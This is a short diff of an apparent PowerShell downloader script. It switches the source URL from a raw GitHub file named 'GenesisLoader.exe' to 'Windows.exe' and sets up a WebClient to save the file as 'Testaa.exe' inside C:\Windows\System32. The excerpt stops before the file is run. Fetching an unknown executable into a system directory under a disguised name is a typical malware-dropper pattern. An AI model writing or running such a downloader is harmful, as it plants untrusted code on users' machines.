@@ -1,6 +1,6 @@
-$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/main/GenesisLoader.exe"
+$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/blob/main/Windows.exe"
 $exePath = "C:\Windows\System32\Testaa.exe"
-zizi
+
 Write-Host "Downloading..." -ForegroundColor Cyan
 
 $wc = New-Object System.Net.WebClient
